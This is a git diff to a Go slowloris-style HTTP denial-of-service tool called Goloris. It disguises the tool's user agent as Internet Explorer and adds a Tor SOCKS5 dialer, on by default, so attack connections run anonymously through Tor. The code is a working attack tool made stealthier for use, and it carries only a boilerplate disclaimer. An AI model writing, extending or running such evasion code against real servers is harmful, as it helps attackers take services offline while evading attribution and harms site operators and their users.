@@ -11,10 +11,12 @@ import (
 	"os/signal"
 	"strings"
 	"time"
+
+	"golang.org/x/net/proxy"
 )
 
 const (
-	defaultUserAgent = "Goloris HTTP DoS"
+	defaultUserAgent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"
 	defaultDOSHeader = "Cookie: a=b"
 	legalDisclaimer  = `Usage of this program for attacking targets without prior mutual consent is
 illegal. It is the end user's responsibility to obey all applicable local,
@@ -22,6 +24,7 @@ state and federal laws. Developers assume no liability and are not
 responsible for any misuse or damage caused by this program.
 This disclaimer was shamelessy copied from sqlmap with minor modifications :)
     `
+	PROXY_ADDR = "127.0.0.1:9050"
 )
 
 type options struct {
@@ -37,6 +40,7 @@ type options struct {
 	timermode      bool
 	finishAfter    time.Duration
 	quiet          bool
+	tor            bool
 }
 
 func (o *options) String() string {
@@ -50,8 +54,9 @@ func (o *options) String() string {
 		"target:        %s\n"+
 		"https:         %t\n"+
 		"DOS header:    %s\n"+
-		"finish after:  %s\n\n", o.numConnections, o.interval, o.timeout, o.method,
-		o.resource, o.userAgent, o.target, o.https, o.dosHeader, o.finishAfter)
+		"finish after:  %s\n"+
+		"tor:           %v\n\n", o.numConnections, o.interval, o.timeout, o.method,
+		o.resource, o.userAgent, o.target, o.https, o.dosHeader, o.finishAfter, o.tor)
 }
 
 func main() {
@@ -68,6 +73,7 @@ func main() {
 	flag.BoolVar(&opts.https, "https", false, "Use HTTPS")
 	flag.BoolVar(&opts.timermode, "timermode", false, "Measure the timeout of the server. connections flag is omitted")
 	flag.BoolVar(&opts.quiet, "quiet", false, "forward stdout to /dev/null")
+	flag.BoolVar(&opts.tor, "tor", true, "Use TOR SOCKS5 proxy")
 	flag.DurationVar(&opts.finishAfter, "finishafter", 0, "Seconds to wait before finishing the request. If zero the request is never finished")
 	flag.Parse()
 
@@ -220,7 +226,20 @@ loop:
 func openConnection(opts options) (net.Conn, error) {
 	var conn net.Conn
 	var err error
+	if opts.tor {
+		// create a socks5 dialer
+		torDialer, err := proxy.SOCKS5("tcp", PROXY_ADDR, nil, proxy.Direct)
+		if err != nil {
+			fmt.Println("FATAL: %v", err)
+			os.Exit(-1)
+		}
+		conn, err = torDialer.Dial("tcp", opts.target)
+		if err != nil {
+			return nil, err
+		}
+		return conn, nil
 
+	}
 	if opts.https {
 		dial := &net.Dialer{Timeout: opts.timeout}
 		config := &tls.Config{InsecureSkipVerify: true}
